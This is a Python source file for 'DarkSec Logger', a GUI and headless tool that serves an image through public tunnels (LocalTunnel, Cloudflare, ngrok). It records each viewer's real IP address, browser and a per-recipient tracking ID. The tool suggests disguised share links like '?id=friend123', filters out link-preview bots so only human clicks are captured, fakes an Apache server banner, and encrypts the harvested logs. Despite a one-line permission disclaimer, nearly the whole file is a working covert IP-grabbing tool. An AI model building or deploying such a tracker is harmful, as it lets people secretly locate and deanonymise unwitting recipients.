#!/usr/bin/env python3
# File: DarkSecLoggerV1.8.py
# DarkSec Logger v1.8 – LT + Cloudflare Tunnel + NGROK + Doctor + Copy/Paste Everywhere
# Features: Proxy-IP logging, Bot filter, AES-256 enc/dec, GUI/Silent, 2-row toolbar,
#           LocalTunnel, Cloudflare (trycloudflare) tunnels, optional ngrok,
#           improved log console (H/V scroll + context menu), copy/paste on ALL entries.
# Use only on systems you own or have explicit permission to test.

import os, sys, time, json, base64, hashlib, threading, re, urllib.parse, subprocess, shutil, secrets, string
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

import tkinter as tk
from tkinter import filedialog, scrolledtext, simpledialog, messagebox

# ---------------------------
# Optional crypto (PyCryptodome)
# ---------------------------
try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except Exception:
    HAS_CRYPTO = False

# ---------------------------
# Optional pyngrok
# ---------------------------
ngrok = None
try:
    from pyngrok import ngrok as _ngrok
    from pyngrok import conf as ngconf
    ngrok = _ngrok
    HAS_PYNGROK = True
except Exception:
    HAS_PYNGROK = False

APP_TITLE = "DarkSec Logger v1.8 – LT + CF + Doctor"
DEFAULT_PORT = 8000

# Globals
selected_image = None
server = None
server_thread = None
silent_mode = False
log_buffer = []
log_widget: tk.Text | None = None
listen_port = DEFAULT_PORT

# Tunnels
lt_proc = None
lt_url = None
cf_proc = None
cf_url = None
ngrok_tunnel = None

# ---------------------------
# Config (ngrok token)
# ---------------------------
CONFIG_DIR = Path.home() / ".config" / "darksec_logger"
CONFIG_FILE = CONFIG_DIR / "config.json"

def _ensure_config_dir():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    try: CONFIG_DIR.chmod(0o700)
    except Exception: pass

def load_config():
    _ensure_config_dir()
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
                return d if isinstance(d, dict) else {}
        except Exception:
            return {}
    return {}

def save_config(d: dict):
    _ensure_config_dir()
    with open(CONFIG_FILE, "w") as f:
        json.dump(d, f, indent=2)
    try: CONFIG_FILE.chmod(0o600)
    except Exception: pass

def get_ngrok_token():
    t = os.environ.get("NGROK_AUTHTOKEN")
    if t: return t.strip()
    d = load_config()
    t = d.get("ngrok_auth_token")
    return t.strip() if t else None

def set_ngrok_token_gui():
    t = simpledialog.askstring("NGROK Auth Token", "Enter your ngrok authtoken:", show="*")
    if not t: return
    cfg = load_config(); cfg["ngrok_auth_token"] = t.strip(); save_config(cfg)
    messagebox.showinfo("Saved", f"Token saved to {CONFIG_FILE} (0600)")

# ---------------------------
# AES-256 (EAX)
# ---------------------------
def _kdf(pw: str) -> bytes:
    return hashlib.sha256(pw.encode()).digest()

def encrypt_logs(s: str, pw: str) -> str:
    if not HAS_CRYPTO: raise RuntimeError("PyCryptodome missing")
    key = _kdf(pw)
    c = AES.new(key, AES.MODE_EAX)
    ct, tag = c.encrypt_and_digest(s.encode())
    return base64.b64encode(c.nonce + tag + ct).decode()

def decrypt_logs_blob(b64: str, pw: str):
    if not HAS_CRYPTO: return None
    try:
        raw = base64.b64decode(b64.encode())
        nonce, tag, ct = raw[:16], raw[16:32], raw[32:]
        key = _kdf(pw)
        c = AES.new(key, AES.MODE_EAX, nonce=nonce)
        return c.decrypt_and_verify(ct, tag).decode()
    except Exception:
        return None

# ---------------------------
# Helpers
# ---------------------------
def content_type_for(path: str) -> str:
    p = path.lower()
    if p.endswith(".png"): return "image/png"
    if p.endswith(".gif"): return "image/gif"
    if p.endswith(".jpg") or p.endswith(".jpeg"): return "image/jpeg"
    if p.endswith(".webp"): return "image/webp"
    return "application/octet-stream"

BOT_UA = re.compile(
    r"(facebookexternalhit|Twitterbot|Slackbot|TelegramBot|Discordbot|WhatsApp|"
    r"LinkedInBot|SkypeUriPreview|Applebot|Pinterest|Google-InspectionTool|"
    r"VKShare|Qwantify|Snapchat|redditbot|bot|crawler|spider)",
    re.I
)

def _log_gui_or_print(msg: str, info_box=False, error_box=False, title="Info"):
    """Route messages to GUI log (with copy/paste console) or print to stdout."""
    msg = msg if msg.endswith("\n") else msg + "\n"
    if log_widget:
        log_append(msg)
        if info_box: messagebox.showinfo(title, msg)
        if error_box: messagebox.showerror(title, msg)
    else:
        print(msg, end="")

# =========================
# Copy/Paste & Scroll Utils
# =========================
def _bind_text_shortcuts(widget: tk.Text):
    # Select All
    widget.bind("<Control-a>", lambda e: (widget.tag_add("sel", "1.0", "end-1c"), "break"))
    widget.bind("<Command-a>", lambda e: (widget.tag_add("sel", "1.0", "end-1c"), "break"))
    # Copy
    widget.bind("<Control-c>", lambda e: (widget.event_generate("<<Copy>>"), "break"))
    widget.bind("<Command-c>", lambda e: (widget.event_generate("<<Copy>>"), "break"))
    # Paste (if editable)
    def _paste(evt):
        try:
            if str(widget["state"]) == "disabled":
                return "break"
            widget.event_generate("<<Paste>>")
        except Exception:
            pass
        return "break"
    widget.bind("<Control-v>", _paste)
    widget.bind("<Command-v>", _paste)

def _attach_context_menu_text(widget: tk.Text, readonly=True):
    menu = tk.Menu(widget, tearoff=0)
    menu.add_command(label="Copy", command=lambda: widget.event_generate("<<Copy>>"))
    if not readonly:
        menu.add_command(label="Paste", command=lambda: widget.event_generate("<<Paste>>"))
    menu.add_separator()
    menu.add_command(label="Select All", command=lambda: widget.tag_add("sel", "1.0", "end-1c"))

    def _popup(event):
        try: menu.tk_popup(event.x_root, event.y_root)
        finally: menu.grab_release()

    widget.bind("<Button-3>", _popup)           # Win/Linux
    widget.bind("<Control-Button-1>", _popup)    # macOS ctrl-click

def build_log_console(parent) -> tk.Text:
    """
    Returns a Text widget with BOTH vertical and horizontal scrollbars,
    copy/paste context menu, and keyboard shortcuts bound.
    """
    outer = tk.Frame(parent, bg="black")
    outer.pack(fill="both", expand=True, padx=10, pady=10)

    # Horizontal scrollbar
    hbar = tk.Scrollbar(outer, orient="horizontal")
    hbar.pack(side="bottom", fill="x")

    # Vertical scrollbar
    vbar = tk.Scrollbar(outer, orient="vertical")
    vbar.pack(side="right", fill="y")

    txt = tk.Text(
        outer,
        bg="black",
        fg="lime",
        insertbackground="lime",
        wrap="none",               # allow horizontal scrolling
        undo=False,
        autoseparators=False
    )
    txt.pack(side="left", fill="both", expand=True)

    # Wire scrollbars
    txt.configure(xscrollcommand=hbar.set, yscrollcommand=vbar.set)
    hbar.configure(command=txt.xview)
    vbar.configure(command=txt.yview)

    # Shortcuts + context menu (read-only for logs)
    _bind_text_shortcuts(txt)
    _attach_context_menu_text(txt, readonly=True)

    txt.configure(state="normal")
    return txt

def log_append(line: str):
    """Safe append that preserves read-only feel but allows selection/copy."""
    global log_widget
    if not log_widget:
        return
    prev_state = str(log_widget["state"])
    try:
        if prev_state == "disabled":
            log_widget.configure(state="normal")
        log_widget.insert(tk.END, line)
        log_widget.see(tk.END)
    finally:
        log_widget.configure(state="disabled")

# --- Entry widgets copy/paste ---
def _bind_entry_shortcuts(widget: tk.Entry):
    widget.bind("<Control-a>", lambda e: (widget.selection_range(0, 'end'), "break"))
    widget.bind("<Command-a>", lambda e: (widget.selection_range(0, 'end'), "break"))
    widget.bind("<Control-c>", lambda e: (widget.event_generate("<<Copy>>"), "break"))
    widget.bind("<Command-c>", lambda e: (widget.event_generate("<<Copy>>"), "break"))
    widget.bind("<Control-v>", lambda e: (widget.event_generate("<<Paste>>"), "break"))
    widget.bind("<Command-v>", lambda e: (widget.event_generate("<<Paste>>"), "break"))
    widget.bind("<Control-x>", lambda e: (widget.event_generate("<<Cut>>"), "break"))
    widget.bind("<Command-x>", lambda e: (widget.event_generate("<<Cut>>"), "break"))

def _attach_context_menu_entry(widget: tk.Entry):
    m = tk.Menu(widget, tearoff=0)
    m.add_command(label="Cut",   command=lambda: widget.event_generate("<<Cut>>"))
    m.add_command(label="Copy",  command=lambda: widget.event_generate("<<Copy>>"))
    m.add_command(label="Paste", command=lambda: widget.event_generate("<<Paste>>"))
    m.add_separator()
    m.add_command(label="Select All", command=lambda: widget.selection_range(0, 'end'))

    def _popup(e):
        try: m.tk_popup(e.x_root, e.y_root)
        finally: m.grab_release()

    widget.bind("<Button-3>", _popup)
    widget.bind("<Control-Button-1>", _popup)  # macOS

def enable_copy_paste_all_entries(root_widget: tk.Misc):
    """Attach copy/paste/context-menu to ALL Entry widgets in the UI."""
    stack = [root_widget]
    while stack:
        w = stack.pop()
        if isinstance(w, tk.Entry):
            _bind_entry_shortcuts(w)
            _attach_context_menu_entry(w)
        try:
            for child in w.winfo_children():
                stack.append(child)
        except Exception:
            pass

# ---------------------------
# HTTP Handler
# ---------------------------
class TrackerHandler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs): return  # silence default logging

    def do_GET(self):
        global log_buffer, selected_image

        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        click_id = qs.get("id", [""])[0]

        # Prefer proxy headers for real origin (tunnels/reverse proxies)
        xff = self.headers.get("X-Forwarded-For")
        xri = self.headers.get("X-Real-IP")
        origin_ip = (xff.split(",")[0].strip() if xff else None) or (xri.strip() if xri else None)
        client_ip = origin_ip or self.client_address[0]

        ua = self.headers.get("User-Agent", "Unknown")
        is_bot = bool(BOT_UA.search(ua))
        tag = "BOT" if is_bot else "HUMAN"
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        log_line = f"[{ts}] [{tag}] IP: {client_ip} | UA: {ua} | PATH: {self.path} | ID: {click_id}\n"
        log_buffer.append(log_line)
        _log_gui_or_print(log_line)

        try:
            if selected_image and os.path.exists(selected_image):
                with open(selected_image, "rb") as f:
                    img = f.read()
                self.send_response(200)
                self.send_header("Content-Type", content_type_for(selected_image))
                self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
                self.send_header("Cache-Control", "max-age=86400, private")
                self.send_header("Content-Length", str(len(img)))
                self.send_header("Vary", "User-Agent, X-Forwarded-For")
                self.end_headers()
                self.wfile.write(img)
            else:
                self.send_response(404)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
                self.end_headers()
                self.wfile.write(b"<h1>404 Not Found</h1>")
        except Exception:
            self.send_response(500); self.end_headers(); self.wfile.write(b"Internal Server Error")

# ---------------------------
# Server Control
# ---------------------------
def start_server(port: int):
    global server
    server = HTTPServer(("0.0.0.0", port), TrackerHandler)
    server.serve_forever()

def start_logging():
    global server_thread
    if not selected_image:
        if not silent_mode: messagebox.showerror("Error", "Select an image before starting the server.")
        else: print("[-] No image selected. In silent mode, pass --image /path/to.jpg or place 'silent.jpg' next to script.")
        return
    server_thread = threading.Thread(target=start_server, args=(listen_port,), daemon=True)
    server_thread.start()
    _log_gui_or_print(f"[*] DarkSec Logger started on port {listen_port}\n")

def stop_logging():
    global server, ngrok_tunnel, lt_proc, cf_proc, lt_url, cf_url
    if server:
        server.shutdown(); server = None
        _log_gui_or_print("[*] DarkSec Logger stopped.\n")
    if ngrok_tunnel and ngrok:
        try: ngrok.disconnect(ngrok_tunnel.public_url); ngrok.kill()
        except Exception: pass
        ngrok_tunnel = None
        _log_gui_or_print("[*] NGROK tunnel stopped.\n")
    if lt_proc and lt_proc.poll() is None:
        try: lt_proc.terminate()
        except Exception: pass
        _log_gui_or_print("[*] LocalTunnel stopped.\n")
    lt_proc = None; lt_url = None
    if cf_proc and cf_proc.poll() is None:
        try: cf_proc.terminate()
        except Exception: pass
        _log_gui_or_print("[*] Cloudflare Tunnel stopped.\n")
    cf_proc = None; cf_url = None

# ---------------------------
# Logs (Encrypt/Decrypt)
# ---------------------------
def save_logs_encrypted():
    if not log_buffer:
        messagebox.showwarning("No Logs", "No logs to save yet."); return
    if not HAS_CRYPTO:
        messagebox.showerror("Missing", "PyCryptodome not installed."); return
    pw = simpledialog.askstring("Encryption", "Enter password to encrypt logs:", show="*")
    if not pw: return
    enc = encrypt_logs("".join(log_buffer), pw)
    fp = filedialog.asksaveasfilename(defaultextension=".log.enc", filetypes=[("Encrypted Log","*.log.enc")])
    if fp:
        with open(fp, "w") as f: f.write(enc)
        messagebox.showinfo("Saved", f"Logs saved at:\n{fp}")

def decrypt_logs_gui():
    if not HAS_CRYPTO:
        messagebox.showerror("Missing", "PyCryptodome not installed."); return
    fp = filedialog.askopenfilename(filetypes=[("Encrypted Log","*.log.enc")])
    if not fp: return
    enc = open(fp, "r").read()
    pw = simpledialog.askstring("Decryption", "Enter password:", show="*")
    if not pw: return
    plain = decrypt_logs_blob(enc, pw)
    if plain is None:
        messagebox.showerror("Error", "Wrong password or corrupted file."); return
    top = tk.Toplevel(); top.title("Decrypted Logs")
    txt = scrolledtext.ScrolledText(top, width=100, height=30)
    txt.insert(tk.END, plain); txt.configure(state="disabled"); txt.pack(fill="both", expand=True, padx=8, pady=8)
    def save_as():
        out = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text File","*.txt")])
        if out: open(out,"w").write(plain); messagebox.showinfo("Saved", f"Saved to:\n{out}")
    tk.Button(top, text="Save As...", command=save_as).pack(pady=6)

# ---------------------------
# Image select (GUI)
# ---------------------------
def select_image():
    global selected_image
    fp = filedialog.askopenfilename(
        title="Select image to serve",
        filetypes=[("Images", "*.jpg *.jpeg *.png *.gif *.webp"), ("All files", "*.*")]
    )
    if fp:
        selected_image = fp
        _log_gui_or_print(f"[*] Selected image: {selected_image}\n")

# ---------------------------
# LocalTunnel
# ---------------------------
def rand_subdomain(prefix="dsec", n=6):
    alphabet = string.ascii_lowercase + string.digits
    return prefix + ''.join(secrets.choice(alphabet) for _ in range(n))

def _parse_url_any(line: str, host_part: str) -> str | None:
    m = re.search(r"https://[^\s]*" + re.escape(host_part), line)
    return m.group(0) if m else None

def start_localtunnel_gui():
    return _start_localtunnel(subdomain=simpledialog.askstring("LocalTunnel", "Custom subdomain (optional):"))

def start_localtunnel_cli(subdomain: str | None):
    return _start_localtunnel(subdomain=subdomain)

def _start_localtunnel(subdomain: str | None):
    global lt_proc, lt_url
    if lt_proc and lt_proc.poll() is None:
        _log_gui_or_print(f"[i] LocalTunnel already running: {lt_url}", info_box=True, title="LocalTunnel")
        return
    lt_bin = shutil.which("lt")
    if not lt_bin:
        _log_gui_or_print("LocalTunnel CLI not found. Install:\n  npm install -g localtunnel", error_box=True, title="LocalTunnel")
        return
    sub = subdomain.strip() if subdomain else rand_subdomain()
    args = [lt_bin, "--port", str(listen_port), "--subdomain", sub]
    try:
        lt_proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        _log_gui_or_print(f"[!] Failed to start LocalTunnel: {e}\n", error_box=True, title="LocalTunnel")
        return
    _log_gui_or_print("[*] Starting LocalTunnel...\n")
    def reader():
        global lt_url
        for line in lt_proc.stdout:
            _log_gui_or_print(line)
            url = _parse_url_any(line, ".loca.lt")
            if url:
                lt_url = url
                tip = f"\n[+] Share: {lt_url}/{Path(selected_image).name}?id=friend123" if selected_image else ""
                _log_gui_or_print(f"[*] LocalTunnel URL: {lt_url}{tip}\n", info_box=True, title="LocalTunnel")
                break
    threading.Thread(target=reader, daemon=True).start()

def stop_localtunnel():
    global lt_proc, lt_url
    if lt_proc and lt_proc.poll() is None:
        try: lt_proc.terminate()
        except Exception: pass
        _log_gui_or_print("[*] LocalTunnel stopped.\n")
    else:
        _log_gui_or_print("LocalTunnel not running.\n", info_box=True, title="LocalTunnel")
    lt_proc = None; lt_url = None

# ---------------------------
# Cloudflare Tunnel (TryCloudflare)
# ---------------------------
def start_cloudflare_tunnel():
    """Start a free TryCloudflare tunnel: cloudflared tunnel --url http://localhost:<port>"""
    global cf_proc, cf_url
    if cf_proc and cf_proc.poll() is None:
        _log_gui_or_print(f"[i] Cloudflare Tunnel already running: {cf_url}", info_box=True, title="Cloudflare")
        return
    cf_bin = shutil.which("cloudflared")
    if not cf_bin:
        _log_gui_or_print(
            "cloudflared not found. Install:\n"
            "  macOS (Homebrew): brew install cloudflared\n"
            "  Debian/Ubuntu:    sudo apt install cloudflared",
            error_box=True, title="Cloudflare"
        ); return
    args = [cf_bin, "tunnel", "--url", f"http://localhost:{listen_port}", "--no-autoupdate"]
    try:
        cf_proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        _log_gui_or_print(f"[!] Failed to start Cloudflare Tunnel: {e}\n", error_box=True, title="Cloudflare")
        return
    _log_gui_or_print("[*] Starting Cloudflare Tunnel...\n")
    def reader():
        global cf_url
        for line in cf_proc.stdout:
            _log_gui_or_print(line)
            url = _parse_url_any(line, "trycloudflare.com")
            if url:
                cf_url = url
                tip = f"\n[+] Share: {cf_url}/{Path(selected_image).name}?id=friend123" if selected_image else ""
                _log_gui_or_print(f"[*] Cloudflare URL: {cf_url}{tip}\n", info_box=True, title="Cloudflare")
                break
    threading.Thread(target=reader, daemon=True).start()

def stop_cloudflare_tunnel():
    global cf_proc, cf_url
    if cf_proc and cf_proc.poll() is None:
        try: cf_proc.terminate()
        except Exception: pass
        _log_gui_or_print("[*] Cloudflare Tunnel stopped.\n")
    else:
        _log_gui_or_print("Cloudflare Tunnel not running.\n", info_box=True, title="Cloudflare")
    cf_proc = None; cf_url = None

# ---------------------------
# ngrok (optional)
# ---------------------------
def start_ngrok():
    global ngrok_tunnel
    if not HAS_PYNGROK:
        _log_gui_or_print("pyngrok not installed. Install:\n  python3 -m pip install pyngrok", error_box=True, title="NGROK")
        return
    if ngrok_tunnel:
        _log_gui_or_print(f"NGROK already running: {ngrok_tunnel.public_url}", info_box=True, title="NGROK"); return
    try:
        tok = get_ngrok_token()
        if tok: ngconf.get_default().auth_token = tok
    except Exception: pass
    try:
        ngrok_tunnel = ngrok.connect(listen_port, "http")
    except Exception as e:
        _log_gui_or_print(f"[!] NGROK failed: {e}\n", error_box=True, title="NGROK"); return
    public_url = ngrok_tunnel.public_url
    tip = f"\n[+] Share: {public_url}/{Path(selected_image).name}?id=friend123" if selected_image else ""
    _log_gui_or_print(f"[*] NGROK tunnel: {public_url}{tip}\n", info_box=True, title="NGROK")

# ---------------------------
# Dependency Doctor
# ---------------------------
def run_doctor():
    msgs = []
    def ok(s): return f"[OK] {s}\n"
    def warn(s): return f"[WARN] {s}\n"
    def fail(s): return f"[FAIL] {s}\n"

    msgs.append(ok(f"Python {sys.version.split()[0]}"))
    msgs.append(ok("Tkinter GUI available"))

    if HAS_CRYPTO: msgs.append(ok("PyCryptodome installed"))
    else: msgs.append(fail("PyCryptodome missing → fix:\n  python3 -m pip install pycryptodome"))

    if HAS_PYNGROK: msgs.append(ok("pyngrok installed"))
    else: msgs.append(warn("pyngrok not installed (optional) →\n  python3 -m pip install pyngrok"))

    # CLIs
    node = shutil.which("node"); npm = shutil.which("npm"); lt = shutil.which("lt"); cf = shutil.which("cloudflared")
    if node: msgs.append(ok("node found"))
    else: msgs.append(warn("node missing → macOS: brew install node | Debian/Ubuntu: sudo apt install nodejs"))
    if npm: msgs.append(ok("npm found"))
    else: msgs.append(warn("npm missing → macOS: brew install npm | Debian/Ubuntu: sudo apt install npm"))
    if lt: msgs.append(ok("localtunnel found"))
    else: msgs.append(warn("LocalTunnel missing → npm install -g localtunnel"))
    if cf: msgs.append(ok("cloudflared found"))
    else: msgs.append(warn("cloudflared missing → macOS: brew install cloudflared | Debian/Ubuntu: sudo apt install cloudflared"))

    tok = get_ngrok_token()
    if tok: msgs.append(ok("ngrok token present (env or config)"))
    else: msgs.append(warn("ngrok token not set (only needed if you use ngrok).\n  GUI: Set NGROK Token\n  CLI: --set-ngrok-token YOUR_TOKEN"))

    out = "".join(msgs)
    _log_gui_or_print("\n=== Dependency Doctor ===\n" + out + "\n", info_box=True, title="Dependency Doctor")

# ---------------------------
# GUI (two-row toolbar)
# ---------------------------
def run_gui():
    global log_widget, listen_port
    root = tk.Tk()
    root.title(APP_TITLE)
    root.geometry("1040x620")
    root.minsize(900, 520)
    root.configure(bg="black")

    title = tk.Label(root, text="DarkSec Logger", fg="lime", bg="black", font=("Consolas", 20, "bold"))
    title.pack(pady=6)

    # Row 1 (core actions)
    row1 = tk.Frame(root, bg="black"); row1.pack(pady=(2,0), padx=8, fill="x")
    tk.Label(row1, text="Port:", bg="black", fg="white").pack(side="left", padx=(0,6))
    port_entry = tk.Entry(row1, width=7); port_entry.insert(0, str(DEFAULT_PORT)); port_entry.pack(side="left", padx=(0,10))
    def apply_port():
        nonlocal port_entry
        global listen_port
        try:
            p = int(port_entry.get())
            if not (1 <= p <= 65535): raise ValueError
            listen_port = p
            messagebox.showinfo("Port", f"Listening on {listen_port}")
        except Exception:
            messagebox.showerror("Port Error", "Enter a valid port (1-65535).")
    tk.Button(row1, text="Set Port", command=apply_port, bg="gray20", fg="white").pack(side="left", padx=4)
    tk.Button(row1, text="Select Image", command=select_image, bg="gray20", fg="white").pack(side="left", padx=4)
    tk.Button(row1, text="Start Server", command=start_logging, bg="green", fg="black").pack(side="left", padx=4)
    tk.Button(row1, text="Stop Server", command=stop_logging, bg="red", fg="white").pack(side="left", padx=4)

    # Row 2 (tunnels, crypto, doctor)
    row2 = tk.Frame(root, bg="black"); row2.pack(pady=(6,4), padx=8, fill="x")
    tk.Button(row2, text="Start LocalTunnel", command=start_localtunnel_gui, bg="magenta", fg="black").pack(side="left", padx=4)
    tk.Button(row2, text="Stop LocalTunnel", command=stop_localtunnel, bg="magenta", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Start Cloudflare Tunnel", command=start_cloudflare_tunnel, bg="#00ADEE", fg="black").pack(side="left", padx=4)
    tk.Button(row2, text="Stop Cloudflare Tunnel", command=stop_cloudflare_tunnel, bg="#007399", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Start NGROK", command=start_ngrok, bg="orange", fg="black").pack(side="left", padx=4)
    tk.Button(row2, text="Set NGROK Token", command=set_ngrok_token_gui, bg="gray20", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Save Encrypted Logs", command=save_logs_encrypted, bg="blue", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Decrypt Logs", command=decrypt_logs_gui, bg="purple", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Run Dependency Doctor", command=run_doctor, bg="cyan", fg="black").pack(side="left", padx=4)

    # Log console (copy/paste + H/V scrollbars)
    log_widget = build_log_console(root)
    log_widget.configure(state="disabled")

    # Enable copy/paste on ALL Entry widgets in the UI (e.g., Port box)
    enable_copy_paste_all_entries(root)

    def on_close():
        stop_logging()
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)
    root.after(500, run_doctor)  # auto-doctor
    root.mainloop()

# ---------------------------
# CLI helpers & entry
# ---------------------------
def usage():
    print(f"""
{APP_TITLE}

Usage:
  python3 DarkSecLoggerV1.8.py                       # GUI
  python3 DarkSecLoggerV1.8.py --silent              # headless (port {DEFAULT_PORT})
  python3 DarkSecLoggerV1.8.py --silent --port 8080  # headless custom port
  python3 DarkSecLoggerV1.8.py --silent --image /path/to.jpg
  python3 DarkSecLoggerV1.8.py --silent --localtunnel [--subdomain NAME]
  python3 DarkSecLoggerV1.8.py --silent --cloudflare
  python3 DarkSecLoggerV1.8.py --silent --ngrok
  python3 DarkSecLoggerV1.8.py --set-ngrok-token YOUR_TOKEN
  python3 DarkSecLoggerV1.8.py --show-config
""".strip())

def main_cli():
    global silent_mode, listen_port, selected_image, ngrok_tunnel
    args = sys.argv[1:]
    if not args:
        run_gui(); return

    if args[0] in ("-h", "--help"):
        usage(); return

    if args[0] == "--set-ngrok-token":
        if len(args) < 2:
            print("Usage: --set-ngrok-token YOUR_TOKEN"); return
        cfg = load_config(); cfg["ngrok_auth_token"] = args[1].strip(); save_config(cfg)
        print("[*] ngrok token saved."); return

    if args[0] == "--show-config":
        print(json.dumps(load_config(), indent=2)); return

    if args[0] == "--silent":
        silent_mode = True
        # Parse optional flags
        i = 1
        subdomain = None
        start_lt = False
        start_ng = False
        start_cf = False
        while i < len(args):
            if args[i] == "--port":
                listen_port = int(args[i+1]); i += 2
            elif args[i] == "--image":
                selected_image = args[i+1]; i += 2
            elif args[i] in ("--localtunnel", "--lt"):
                start_lt = True; i += 1
            elif args[i] == "--subdomain":
                subdomain = args[i+1]; i += 2
            elif args[i] == "--ngrok":
                start_ng = True; i += 1
            elif args[i] == "--cloudflare":
                start_cf = True; i += 1
            else:
                print(f"[!] Unknown flag: {args[i]}"); i += 1

        if not selected_image and os.path.exists("silent.jpg"):
            selected_image = "silent.jpg"

        if not selected_image:
            print("[!] No image selected. Use --image /path/to.jpg or place silent.jpg next to script.")

        # Start server
        start_logging()

        # Start LT if requested
        if start_lt:
            start_localtunnel_cli(subdomain=subdomain)

        # Start Cloudflare if requested
        if start_cf:
            start_cloudflare_tunnel()

        # Start ngrok if requested
        if start_ng:
            if not HAS_PYNGROK:
                print("[!] pyngrok not installed: python3 -m pip install pyngrok")
            else:
                try:
                    tok = get_ngrok_token()
                    if tok: ngconf.get_default().auth_token = tok
                    ngrok_tunnel = ngrok.connect(listen_port, "http")
                    print(f"[*] NGROK: {ngrok_tunnel.public_url}")
                    if selected_image:
                        print(f"[+] Share: {ngrok_tunnel.public_url}/{Path(selected_image).name}?id=test001")
                except Exception as e:
                    print(f"[!] NGROK failed: {e}")

        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_logging(); print("[*] Stopped.")
        return

    # Fallback: unknown args -> GUI
    run_gui()

# ---------------------------
# Entry
# ---------------------------
if __name__ == "__main__":
    main_cli()